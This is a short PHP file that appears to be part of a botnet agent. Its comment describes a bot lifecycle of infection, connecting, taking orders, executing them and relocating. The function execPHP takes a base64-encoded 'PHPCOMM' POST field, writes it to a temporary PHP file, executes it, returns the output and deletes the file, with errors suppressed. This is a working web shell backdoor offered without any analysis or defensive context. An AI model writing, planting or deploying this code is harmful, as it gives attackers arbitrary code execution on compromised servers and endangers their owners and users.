<?php

    // SCENARION :  BOT INFECTED -- > BOT FIRST CONNECTION --> BOT SUCCESSFULL DECLARATION --> BOT DELETE DECLARATION FUNCTION --> BOT LISTEN FOR NEW ORDER -- > BOT EXECUTE ORDER -- > BOT CHANGE LOCATION AND SEND NEW LOCATION LINK 

function execPHP(){
    GLOBAL $_POST ;
    if(isset($_POST['PHPCOMM'])){
        
        @ob_flush();@ob_start();$file = tempnam(sys_get_temp_dir(), 'GK').".php";
        file_put_contents($file, '<?'.base64_decode(trim($_POST['PHPCOMM'])).'?>');
        include($file); echo  @ob_get_clean();@unlink($file);@ob_end_flush();

        die();
    }

}
execPHP();
?>